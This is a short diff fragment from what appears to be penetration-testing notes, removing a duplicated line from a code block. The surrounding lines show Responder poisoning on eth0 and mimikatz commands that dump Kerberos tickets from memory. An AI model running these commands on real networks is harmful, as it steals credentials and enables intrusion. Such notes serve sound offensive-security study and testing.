@@ -26,6 +26,5 @@ responder -I eth0 -v
 ```bash
 mimikatz.exe
 privilege::debug
-privilege::debug
 sekurlsa::tickets /export
 ```
